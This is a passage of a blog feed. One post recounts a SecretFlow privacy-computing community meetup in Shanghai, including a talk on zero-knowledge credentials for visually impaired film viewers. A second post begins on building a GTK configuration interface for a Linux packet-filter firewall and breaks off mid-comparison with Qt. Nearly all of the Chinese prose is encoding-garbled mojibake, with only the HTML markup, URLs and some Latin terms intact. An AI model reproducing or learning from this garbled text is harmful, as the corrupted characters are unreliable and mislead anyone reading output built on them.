å¯†åçš„æ‚£è€…æ•°æ®äº¤ç»™åŒ»ç–—ä¿é™©å…¬å¸ï¼ŒåŒ»ç–—ä¿é™©å…¬å¸å¯¹å¯†æ€æ•°æ®è¿›è¡Œä¸€ç³»åˆ—è®¡ç®—ï¼ˆæ— æ³•è§£å¯†ï¼‰åå¾—åˆ°ç»“æœï¼šæ‚£è€…Açš„å¥åº·é£é™©é«˜ã€æ‚£è€…Bçš„å¥åº·é£é™©ä½â€¦â€¦ä½†æ˜¯å¹¶ä¸çŸ¥é“æ‚£è€…Açš„è¿‡å¾€ç—…å²ã€ä½é™¢è®°å½•ç­‰ä¿¡æ¯ã€‚</p><h2 id="éšè¯­åˆæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#éšè¯­åˆæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="éšè¯­åˆæ˜¯ä»€ä¹ˆï¼Ÿ"></a>éšè¯­åˆæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>éšè¯­æ˜¯ä¸€ä¸ªå¼€æºçš„éšç§è®¡ç®—æ¡†æ¶ï¼Œæ ¸å¿ƒèšç„¦äºå¦‚ä½•ä¸°å¯Œäº§ä¸šåº”ç”¨åœºæ™¯ï¼Œä»¥åŠå¦‚ä½•æå‡éšç§è®¡ç®—èƒ½åŠ›ä¸¤ä¸ªæ–¹é¢ã€‚</p><blockquote><h3 id="1-é¢å‘ä½¿ç”¨è€…"><a href="#1-é¢å‘ä½¿ç”¨è€…" class="headerlink" title="1.é¢å‘ä½¿ç”¨è€…"></a>1.é¢å‘ä½¿ç”¨è€…</h3><p>éšè¯­å¯ä»¥æä¾›é€‚é…äºä¸åŒåœºæ™¯çš„å¤šç§è§£å†³æ–¹æ¡ˆï¼Œåœ¨æ¯ç§è§£å†³æ–¹æ¡ˆä¹‹ä¸­ï¼Œéƒ½å¯ä»¥æä¾›å®‰å…¨çš„å…¨é“¾è·¯æ•°æ®å¤„ç†èƒ½åŠ›ï¼Œä¹Ÿå¯ä»¥é’ˆå¯¹ä¸åŒä¸šåŠ¡é˜¶æ®µæä¾›å¦‚å¿«é€ŸPOCã€å¤§è§„æ¨¡ã€é«˜å¯ç”¨çš„èƒ½åŠ›ã€‚</p><h3 id="2-é¢å‘å¼€å‘è€…"><a href="#2-é¢å‘å¼€å‘è€…" class="headerlink" title="2.é¢å‘å¼€å‘è€…"></a>2.é¢å‘å¼€å‘è€…</h3><p>é’ˆå¯¹åº”ç”¨ç³»ç»Ÿçš„é›†æˆè€…ï¼Œéšè¯­å¯ä»¥æä¾›åŸå­åŒ–çš„é›†æˆèƒ½åŠ›ã€‚é’ˆå¯¹æœºå™¨å­¦ä¹ ç®—æ³•å¼€å‘è€…ï¼Œéšè¯­æä¾›æ¥è¿‘ä¼ ç»Ÿæœºå™¨å­¦ä¹ ç®—æ³•å¼€å‘çš„ä½“éªŒã€‚é’ˆå¯¹å®‰å…¨åè®®å¼€å‘è€…ï¼Œå¯ä»¥æä¾›æ’æ‹¨å¼çš„å¿«é€Ÿåè®®æ¥å…¥èƒ½åŠ›ã€‚</p></blockquote><p>ä¸ªäººçš„ç†è§£æ˜¯ï¼Œéšè¯­æ¡†æ¶å’Œç¤¾åŒºçš„å‡ºç°æ˜¯ä¸ºäº†å»ºè®¾ä¸€ä¸ªéšç§è®¡ç®—å­¦ä¹ ã€å¼€å‘ä¸ä½¿ç”¨çš„è‰¯å¥½ç”Ÿæ€ï¼Œè®©éšç§è®¡ç®—èƒ½å¤Ÿå°½å¿«åœ¨æ›´å¤šäº§ä¸šè½åœ°ï¼Œè®©éšç§è®¡ç®—æŠ€æœ¯èƒ½å¤Ÿå¿«é€Ÿå‘å±•ã€‚å½“ç„¶äº†ï¼Œåœ¨éšç§è®¡ç®—æŠ€æœ¯è¿˜ä¸ç®—æˆç†Ÿçš„æ—¶æœŸå¼€å‘ä¸€ä¸ªé«˜å¯ç”¨çš„æ¡†æ¶ï¼ŒåŠ¿å¿…ä¼šè®©è¯¥æ¡†æ¶å æœ‰ä¸€å¸­ä¹‹åœ°ï¼Œå¢åŠ èš‚èšé›†å›¢åœ¨éšç§è®¡ç®—æ–¹é¢çš„å½±å“åŠ›ä¸è¯è¯­æƒã€‚</p><h2 id="ä¸ä¼šè®°å½•"><a href="#ä¸ä¼šè®°å½•" class="headerlink" title="ä¸ä¼šè®°å½•"></a>ä¸ä¼šè®°å½•</h2><h3 id="ä¼šåœº"><a href="#ä¼šåœº" class="headerlink" title="ä¼šåœº"></a>ä¼šåœº</h3><p>è¿™æ¬¡è§é¢ä¼šå®‰æ’åœ¨ä¸Šæµ·ç§‘å­¦ä¼šå ‚ã€‚è¯´èµ·æ¥å€’æ˜¯æˆ‘åœ¨ä¸Šæµ·è¿™ä¹ˆå¤šå¹´ç¬¬ä¸€æ¬¡å»ä¸Šæµ·ç§‘å­¦ä¼šå ‚<del>ï¼ˆæ¯•ç«Ÿç§‘å­¦ç´ å…»ä¸å¤Ÿï¼‰</del>ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe1b38a067.jpg" data-fancybox="default" data-caption="ä¸Šæµ·ç§‘å­¦ä¼šå ‚å»ºç­‘ä¹‹ä¸€"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe1b38a067.jpg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe1b38a067.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ä¸Šæµ·ç§‘å­¦ä¼šå ‚å»ºç­‘ä¹‹ä¸€"></a><span class="image-caption">ä¸Šæµ·ç§‘å­¦ä¼šå ‚å»ºç­‘ä¹‹ä¸€</span></div></div><p>åƒæ˜¯æ°‘å›½æ—¶æœŸçš„å»ºç­‘ï¼Œåæ¥å»æœç´¢äº†ä¸‹ï¼š</p><blockquote><p>è¯¥å»ºç­‘åŸä¸ºæ³•å›½æ€»ä¼šï¼Œå§‹å»ºäº1904å¹´ã€‚1957å¹´æ”¹ä¸ºç§‘æŠ€å·¥ä½œè€…æ´»åŠ¨åœºæ‰€ã€‚1958å¹´ï¼Œä¸Šæµ·å¸‚ç§‘å­¦æŠ€æœ¯åä¼šæˆç«‹ï¼Œè¿™é‡Œæˆä¸ºå…¶ä¼šå€ã€‚</p></blockquote><p>è¿›ä¼šåœºè¦ç­¾åˆ°ï¼Œå½“æ—¶åœ¨æˆ‘å‰é¢çš„ä¸‰ã€äº”äººä¼¼ä¹æ˜¯ä¸€ä¸ªå…¬å¸çš„ï¼Œåœ¨æˆ‘åé¢çš„çœ‹ç€åƒæ˜¯ç ”ç©¶ç”Ÿã€‚å¥½åœ¨æ˜¯æˆ‘çœ‹ä¸Šå»æ¯”å®é™…è€ä¸ªå‡ å²ï¼ˆåœ¨çƒåœºç»å¸¸æœ‰äººé—®æˆ‘åšä»€ä¹ˆå·¥ä½œçš„ï¼‰ï¼Œå€’ä¹Ÿä¸æ˜¾å¾—æ€ªå¼‚ã€‚ç­¾å®Œåˆ°ï¼Œå‘äº†æœ¬å…³äºéšè¯­çš„å°å†Œå­ï¼Œè¿˜ç»™æˆ‘åœ¨å·¦è‡‚è´´äº†ä¸ªå†™æœ‰â€œå˜‰å®¾â€äºŒå­—çš„è´´çº¸ï¼Œè¿˜æŒºæ­£å¼çš„ï¼Œåæ¥æ‰çŸ¥é“çœŸæ­£çš„å¤§å’–è´´çº¸ä¸Šå†™ç€â€œVIPâ€ã€‚</p><p>ä¸Šåˆ°äºŒæ¥¼ï¼Œå‘Šè¯‰æˆ‘å¯ä»¥æ‹ç…§ç•™å¿µï¼Œå°±æ‹äº†ä¸€å¼ ã€‚æ²¡æˆæƒ³æ”¾åœ¨äº‘ç›¸å†Œï¼Œæ¸…æ™°åº¦æ²¡æˆ‘æƒ³è±¡ä¸­é«˜ã€‚æ—è¾¹å¡«å†™é—®å·è¿˜å¯ä»¥é¢†å–å‘¨è¾¹ï¼Œæœ¬æ¥èµ°çƒ­äº†ä¸æƒ³å¡«ï¼Œä¸€å¬æœ‰é›¨ä¼ï¼Œå¾…ä¼šå¯èƒ½ä¸‹é›¨æˆ‘åˆæ²¡å¸¦ä¼ï¼Œè¿˜æ˜¯æ¯›äº†å§ğŸ¤£ã€‚é—®å·æ˜¯å…³äºéšè¯­1.0ä½“éªŒç‰ˆMVPéƒ¨ç½²åŒ…ä½¿ç”¨ä½“éªŒçš„ï¼Œè¦å¡«ä»äº‹ä»€ä¹ˆå·¥ä½œï¼Œä¸€çœ‹ï¼Œä»€ä¹ˆäº§å“å¼€å‘ã€ä»€ä¹ˆç®—æ³•ã€ä»€ä¹ˆè¿ç»´ã€ä»€ä¹ˆç­–åˆ’ï¼Œåªèƒ½é€‰å…¶ä»–å¡«ä¸ªå­¦ç”Ÿäº†ã€‚å¡«å®Œé—®å·ç»™äº†æˆ‘ä¸€åŒ…è´´çº¸å’Œä¸€æŠŠå¤ªé˜³ä¼ï¼Œçœ‹ç€è´¨é‡è¿˜ä¸é”™ã€‚</p><p>æ‹¿ç€å‘¨è¾¹æˆ‘å°±è¿›ä¼šåœºäº†ï¼Œåæ¥æ‰å‘ç°â€¦â€¦é”™è¿‡äº†ç‚¹å¿ƒ<del>â€”â€”A.K.A.æˆ‘çš„ç»ˆæç›®æ ‡</del>ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe1fdc772d.jpeg" data-fancybox="default" data-caption="ç‚¹å¿ƒ"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe1fdc772d.jpeg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe1fdc772d.jpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ç‚¹å¿ƒ"></a><span class="image-caption">ç‚¹å¿ƒ</span></div></div><p>ä¼—æ‰€å‘¨çŸ¥å•Šï¼Œå¤§ä½¬ä¸€èˆ¬æ¥å¾—æ¯”è¾ƒæ™šã€‚æ‰€ä»¥æˆ‘æ˜¯å‰å‡ ä¸ªåˆ°åœºçš„ï¼Œå€’ä¹Ÿå¥½ï¼Œå¯ä»¥æŒ‘ä¸€æŒ‘ä½ç½®ã€‚æœ€ç»ˆæ˜¯ååœ¨ä¸€ä¸ªé åé è¾¹ä½†èƒ½çœ‹æ¸…çš„ä½ç½®ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe1e2b3b69.jpg" data-fancybox="default" data-caption="ä¼šåœºå†…"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe1e2b3b69.jpg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe1e2b3b69.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ä¼šåœºå†…"></a><span class="image-caption">ä¼šåœºå†…</span></div></div><h3 id="å¤§å’–ä»¬"><a href="#å¤§å’–ä»¬" class="headerlink" title="å¤§å’–ä»¬"></a>å¤§å’–ä»¬</h3><p>è¿™æ¬¡Meetupæ¥äº†æŒºå¤šå¤§å’–ï¼Œæ¯”å¦‚ä¸Šæµ·ç§‘åå­¦æœ¯éƒ¨å‰¯éƒ¨é•¿ã€äº¤å¤§æ•™æˆå…¼æœŸæ™ºç ”ç©¶é™¢é¦–å¸­ç§‘å­¦å®¶ã€æµ™å¤§æ±‚æ˜¯è®²å¸­æ•™æˆã€èš‚èšå‰¯æ€»è£å…¼é¦–å¸­æŠ€æœ¯å®‰å…¨å®˜ã€åä¸ºå¯ä¿¡è®¡ç®—é¦–å¸­ç§‘å­¦å®¶â€¦â€¦</p><p>èš‚èšçš„éŸ¦æ€»ï¼Œä»–è¿›é—¨çš„æ—¶å€™æˆ‘å°±è§‰å¾—ä»–åº”è¯¥ä¼šååœ¨VIPå¸­ï¼Œä½†ç»ä¸æ˜¯æ•™æˆğŸ¤£ï¼Œä¸»æ‰“çš„å°±æ˜¯æˆåŠŸäººå£«æ°”è´¨ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe194443f6.jpeg" data-fancybox="default" data-caption="éŸ¦æ€»"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe194443f6.jpeg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe194443f6.jpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="éŸ¦æ€»"></a><span class="image-caption">éŸ¦æ€»</span></div></div><h3 id="ç”¨ç§‘æŠ€æ‰“é€ äººæ–‡å…³æ€€"><a href="#ç”¨ç§‘æŠ€æ‰“é€ äººæ–‡å…³æ€€" class="headerlink" title="ç”¨ç§‘æŠ€æ‰“é€ äººæ–‡å…³æ€€"></a>ç”¨ç§‘æŠ€æ‰“é€ äººæ–‡å…³æ€€</h3><p>è¿™æ¬¡çš„è§é¢ä¼šè®²äº†å¾ˆå¤šè®®é¢˜ï¼Œä½†è®¸å¤šç†å¿µæˆ‘æ˜¯ä¸€çŸ¥åŠè§£ç”šè‡³å®Œå…¨ä¸ç†è§£çš„ã€‚ä¸è¿‡æœ‰ä¸€ä¸ªé¢˜ç›®éå¸¸å¸å¼•æˆ‘ï¼š</p><blockquote><p>æŠ€æœ¯æˆæœï¼šIIFAA Ã— éšè¯­ï¼šåˆ†å¸ƒå¼è®¤è¯åŠ©åŠ›è§†éšœäººç¾¤çº¿ä¸Šè§‚å½±</p></blockquote><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe15ce5854.jpeg" data-fancybox="default" data-caption="å´å¥³å£«æ­£åœ¨æ¼”è®²"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe15ce5854.jpeg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe15ce5854.jpeg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å´å¥³å£«æ­£åœ¨æ¼”è®²"></a><span class="image-caption">å´å¥³å£«æ­£åœ¨æ¼”è®²</span></div></div><p>å´å¥³å£«æåˆ°ä¸€ä¸ªé—®é¢˜ï¼š</p><p>æˆ‘å›½æ˜¯è§†éšœäººç¾¤æœ€å¤šçš„å›½å®¶ã€‚ä»¥å¾€ï¼Œè§†éšœäººç¾¤æƒ³è¦è§‚çœ‹é™¢çº¿ç”µå½±éœ€è¦ç»„ç»‡çº¿ä¸‹è§‚å½±æ´»åŠ¨ï¼Œè®¸å¤šäººè¦åƒé‡Œè¿¢è¿¢å‰å»è§‚å½±ï¼Œååˆ†ä¸ä¾¿ã€‚è€Œå€˜è‹¥ä¸ºä»–ä»¬æä¾›çº¿ä¸Šè§‚å½±æœåŠ¡ï¼Œåˆ™åˆæ¶‰åŠåˆ°ç‰ˆæƒé—®é¢˜ï¼šè§†åŠ›æ— éšœç¢äººç¾¤å‚ä¸å…¶ä¸­ï¼Œä¸€å®šç¨‹åº¦ä¸Šè¾¾åˆ°è§‚çœ‹å¸¸è§„ç‰ˆæœ¬é™¢çº¿ç”µå½±çš„è§‚å½±æ•ˆæœã€‚è¦æƒ³è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œçº¿ä¸Šè§‚å½±æœåŠ¡æä¾›æ–¹å°±å¿…é¡»è·å–ç”¨æˆ·æ˜¯å¦æœ‰è§†åŠ›éšœç¢çš„ä¿¡æ¯ï¼Œä¿¡æ¯æä¾›æ–¹åˆ™åº”ä¸ºä¸­å›½ç›²äººåä¼šç­‰ç»„ç»‡ã€‚ä½†ä¸ºä¿æŠ¤è§†éšœç¾¤ä½“éšç§ï¼Œä¸åº”å½“å°†ä¿¡æ¯ç›´æ¥æš´éœ²ç»™çº¿ä¸Šè§‚å½±æœåŠ¡æä¾›æ–¹ã€‚</p><p>è¿™æ—¶å€™éšç§è®¡ç®—æŠ€æœ¯å°±èµ·åˆ°äº†å…³é”®çš„ä½œç”¨ï¼ŒIIFAAåˆ©ç”¨éšè¯­æ¡†æ¶ä¸­çš„é›¶çŸ¥è¯†è¯æ˜ç­‰å®ç°äº†åˆ†å¸ƒå¼è®¤è¯çš„åŠŸèƒ½ï¼Œèƒ½è®©ç”¨æˆ·è‡ªå·±ä¿å­˜èƒ½è¯æ˜è‡ªå·±å…·æœ‰è§†åŠ›éšœç¢çš„å‡­è¯ã€‚åœ¨ç”¨æˆ·ä¿¡æ¯ä¸æš´éœ²ç»™çº¿ä¸Šè§‚å½±æœåŠ¡æ–¹çš„æƒ…å†µä¸‹ï¼Œå®ç°äº†èº«ä»½è®¤è¯ï¼Œä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†ç‰ˆæƒé—®é¢˜ã€‚</p><p>è¿™ä¸ªè®®é¢˜éå¸¸æ‰“åŠ¨æˆ‘ï¼Œå› ä¸ºåœ¨æˆ‘çœ‹æ¥ï¼Œç§‘æŠ€çš„ç»ˆæç›®æ ‡ï¼Œæ˜¯ä¸ºäº†æ›´å¥½çš„ç¤¾ä¼šã€æ›´å¥½çš„ä¸–ç•Œã€‚åœ¨éšç§è®¡ç®—å‘å±•çš„æ—©æœŸï¼Œé‚£äº›èµ°åœ¨å‰æ²¿çš„äººå°±ä¸å¿˜äººæ–‡å…³æ€€ï¼Œè¿™æ˜¯è¿™ä¸ªæ—¶ä»£çš„è£å¹¸ã€‚éšè¯­ç¤¾åŒºä¸­ä¸ä»…æœ‰èµ°åœ¨å­¦æœ¯å‰æ²¿çš„äººã€èµ°åœ¨å•†ä¸šå‰æ²¿çš„äººï¼Œä¹Ÿæœ‰èµ°åœ¨äººæ–‡å…³æ€€ä¸­çš„äººï¼Œè¿™æ˜¯éšè¯­ç¤¾åŒºæˆé•¿çš„åŸºçŸ³ã€‚</p><h3 id="åˆå½±ç•™å¿µ"><a href="#åˆå½±ç•™å¿µ" class="headerlink" title="åˆå½±ç•™å¿µ"></a>åˆå½±ç•™å¿µ</h3><p>1å‘¨å¹´å…¶å®æ˜¯æœ‰ç”Ÿæ—¥è›‹ç³•åƒçš„ï¼Œä¸è¿‡åœ¨ä¼šåœºå¤–çš„èŒ¶æ­‡åŒºã€‚ä¸ä¼šæœŸé—´ä¸€ç›´æ²¡å‡ºè¿‡ä¼šåœºï¼Œç­‰ç»“æŸçš„æ—¶å€™å‡ºå»ä¸€çœ‹â€¦â€¦è›‹ç³•æ²¡å½±å„¿å“©ã€‚</p><p>ç´¢æ€§å›åˆ°ä¼šåœºå’Œå¤§ä½¬ä»¬æ‹äº†ä¸€å¼ å¤§åˆç…§ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe13015720.jpg" data-fancybox="default" data-caption="å¤§åˆç…§"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe13015720.jpg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe13015720.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å¤§åˆç…§"></a><span class="image-caption">å¤§åˆç…§</span></div></div><h3 id="ç”Ÿæ´»çš„è§’è½"><a href="#ç”Ÿæ´»çš„è§’è½" class="headerlink" title="ç”Ÿæ´»çš„è§’è½"></a>ç”Ÿæ´»çš„è§’è½</h3><p>åœ¨å‡†å¤‡ä¹˜åœ°é“å›å®¶çš„è·¯ä¸Šï¼Œåœ¨å—æ˜Œè·¯å’Œæ€å—è·¯çš„äº¤æ±‡å¤„çœ‹åˆ°è¿™æ ·ä¸€é¢å¢™ï¼Œå€’ä¹Ÿæœ‰è¶£ã€‚</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://bu.dusays.com/2023/07/22/64bbe298e717e.jpg" data-fancybox="default" data-caption="å—æ˜Œè·¯"><img fancybox="" itemprop="contentUrl" src="https://bu.dusays.com/2023/07/22/64bbe298e717e.jpg" class="lazyload" data-srcset="https://bu.dusays.com/2023/07/22/64bbe298e717e.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="å—æ˜Œè·¯"></a><span class="image-caption">å—æ˜Œè·¯</span></div></div><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å›½å†…èƒ½å¤Ÿå¼€å‘è¿™æ ·ä¸€ä¸ªæ¡†æ¶ã€å»ºç«‹è¿™æ ·ä¸€ä¸ªç¤¾åŒºï¼Œå¯¹å›½å†…éšç§è®¡ç®—æŠ€æœ¯çš„å‘å±•æ˜¯ä¸€ä»¶åè¶³å¥½äº‹ã€‚äº‹ç‰©çš„å‘å±•ç¦»ä¸å¼€åŸ¹è‚²å®ƒçš„åœŸå£¤ï¼Œè¿™ä¹Ÿæ˜¯éšè¯­ç¤¾åŒºæŠ“ä½çš„æœ€æ ¸å¿ƒçš„ç†å¿µã€‚è€Œå›½å†…è®¸å¤šè¡Œä¸šå…¶å®éƒ½å¿½ç•¥äº†è¿™æ ·ä¸€ä¸ªç†å¿µï¼Œå¤§å­¦æ•™è‚²æ›´ç”šã€‚è‹¥æ˜¯æœªæ¥èƒ½æœ‰æ›´å¤šè¿™èˆ¬çš„ç»„ç»‡æ¶Œç°ã€åœŸå£¤çš„æ€æƒ³èƒ½å¤Ÿæ·±å…¥äººå¿ƒï¼Œæƒ³å¿…ä¸­å›½ç§‘æŠ€çš„å‘å±•ä¹ƒè‡³ä¸­å›½çš„å‘å±•éƒ½ä¼šå¦‚ä½ æˆ‘æ‰€æ„¿ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.secretflow.org.cn/&quot;&gt;éšè¯­&lt;/a&gt;æ˜¯ç”±èš‚èšé›†å›¢ç‰µå¤´æˆç«‹çš„å¼€æºéšç§è®¡ç®—æ¡†æ¶ï¼Œä»Šå¤©æ˜¯éšè¯­å¼€æºä¸€å‘¨å¹´çš„çº¿ä¸‹äº¤æµæ´»åŠ¨ã€‚è¯´æ¥æƒ­æ„§ï¼Œæˆ‘ä»æœªç»™éšè¯­è´¡çŒ®è¿‡ä¸€è¡Œä»£ç ã€‚æˆ–è€…æ›´å…·ä½“ç‚¹è¯´ï¼Œæˆ‘åœ¨ä¸€å‘¨å¹´Meetupä¸¾è¡Œå‰å‡ å¤©æ‰ä»å…¶ä»–å…¬ä¼—å·äº†è§£</summary>
      
    
    
    
    <category term="å‰æ²¿" scheme="https://blog.beacox.space/categories/%E5%89%8D%E6%B2%BF/"/>
    
    
    <category term="éšç§è®¡ç®—" scheme="https://blog.beacox.space/tags/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97/"/>
    
    <category term="å¼€æº" scheme="https://blog.beacox.space/tags/%E5%BC%80%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>GTKåº”ç”¨å¼€å‘å°è®°</title>
    <link href="https://blog.beacox.space/posts/gtk-first/"/>
    <id>https://blog.beacox.space/posts/gtk-first/</id>
    <published>2023-07-13T08:51:57.000Z</published>
    <updated>2023-07-13T08:51:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¤å­£å­¦æœŸè¯¾ç¨‹çš„å°ç»„ä½œä¸šï¼Œæ˜¯è¦å¼€å‘ä¸€ä¸ªåŸºäºLinuxå†…æ ¸æ¨¡å—çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ã€‚ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†çš„ä»»åŠ¡ï¼š</p><ol><li><p>é…ç½®ç¨‹åº</p><p>è¿è¡Œåœ¨åº”ç”¨å±‚ï¼Œç”¨æ¥é…ç½®è¿‡æ»¤è§„åˆ™ï¼ŒåŒ…æ‹¬åè®®ç±»å‹ã€IPåœ°å€ã€ç«¯å£å·ã€å¼€å§‹å’Œç»“æŸæ—¶é—´ã€æ˜¯å¦å¯ç”¨è§„åˆ™ç­‰ã€‚</p></li><li><p>Linuxå†…æ ¸æ¨¡å—</p><p>è¿è¡Œåœ¨å†…æ ¸å±‚ï¼Œå®ŒæˆåŒ…è¿‡æ»¤é˜²ç«å¢™çš„åŠŸèƒ½ï¼Œè¯¥æ¨¡å—å€ŸåŠ©æ³¨å†ŒNetfilteré’©å­å‡½æ•°çš„æ–¹å¼æ¥å®ç°å¯¹æ•°æ®åŒ…çš„è¿‡æ»¤å’Œæ§åˆ¶ã€‚</p></li></ol><p>æˆ‘ä¸»è¦è´Ÿè´£äº†ç¬¬ä¸€éƒ¨åˆ†çš„ä»»åŠ¡ï¼šå¼€å‘ä¸€ä¸ªå‹å¥½çš„åŒ…è¿‡æ»¤è§„åˆ™çš„é…ç½®å’Œç®¡ç†ç•Œé¢ï¼ˆGUIéƒ¨åˆ†ï¼ŒCLIéƒ¨åˆ†ç”±ç»„é‡Œå¦ä¸€ä½åŒå­¦è´Ÿè´£ï¼‰ã€‚æ”¯æŒåŒ…è¿‡æ»¤çš„è§„åˆ™å¯¼å…¥ã€å¯¼å‡ºï¼Œæ·»åŠ ã€ç¼–è¾‘ã€ åˆ é™¤ã€æœç´¢ç­‰åŠŸèƒ½ã€‚åº”ç”¨ç•Œé¢å¦‚ä¸‹ï¼š</p><div class="tag-plugin swiper-container" width="max"><div class="swiper-wrapper"><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2023/07/12/64ae07efdadeb.png" alt="æ—¥é—´æ¨¡å¼"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2023/07/12/64ae55e8d7ffb.png" alt="æš—é»‘æ¨¡å¼"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2023/07/12/64ae081b86e69.png" alt="ç¼–è¾‘é¡µé¢"></div><div class="swiper-slide"><img no-lazy="" src="https://bu.dusays.com/2023/07/12/64ae55693dde3.png" alt="å…³äºé¡µé¢+æ—¥å¿—é¡µé¢"></div></div><div class="swiper-pagination"></div><div class="swiper-button-prev blur"></div><div class="swiper-button-next blur"></div></div><p>è°ˆä¸ä¸Šå¥½çœ‹ï¼Œä½†ä¹Ÿä¸è‡³äºå¾ˆä¸‘ã€‚</p><h2 id="GTK-vs-QT"><a href="#GTK-vs-QT" class="headerlink" title="GTK vs QT"></a>GTK vs QT</h2><p>GTKå’ŒQTæ˜¯éå¸¸æœ‰åçš„ä¸¤ä¸ªGUIåº“ï¼Œå½“ç„¶QTåº”è¯¥æ˜¯æ›´æœ‰åäº›ã€‚GTKå’ŒQTçš„ä¼˜åŠ¿å¯¹æ¯”å¦‚ä¸‹ï¼š</p><ul><li>QTï¼š<ol><li>è·¨å¹³å°æ€§ï¼šQTæ˜¯ä¸€ä¸ªè·¨å¹³å°çš„å·¥å…·åŒ…ï¼Œå¯ä»¥åœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬Windowsã€Linuxã€macOSç­‰ã€‚å®ƒæä¾›äº†ä¸€è‡´çš„APIï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥è½»æ¾åœ°ç¼–å†™ä¸€æ¬¡ä»£ç ï¼Œç„¶ååœ¨ä¸åŒçš„å¹³å°ä¸Šè¿›è¡Œéƒ¨ç½²å’Œè¿è¡Œã€‚</li><li>é«˜åº¦é›†æˆï¼šQTæä¾›äº†ä¸°å¯Œçš„ç»„ä»¶å’Œå·¥å…·ï¼Œæ¶µç›–äº†å¹¿æ³›çš„åº”ç”¨å¼€å‘éœ€æ±‚ï¼ŒåŒ…æ‹¬å›¾å½¢æ¸²æŸ“ã€ç½‘ç»œé€šä¿¡ã€æ•°æ®åº“è®¿é—®ç­‰ã€‚å®ƒè¿˜æä¾›äº†å¼€å‘è€…å‹å¥½çš„IDEå’Œè°ƒè¯•å·¥å…·ï¼Œä½¿å¾—å¼€å‘è¿‡ç¨‹æ›´åŠ é«˜æ•ˆã€‚</li><li>QMLå’ŒQt Quickï¼šQTå¼•å…¥äº†QMLå’ŒQt 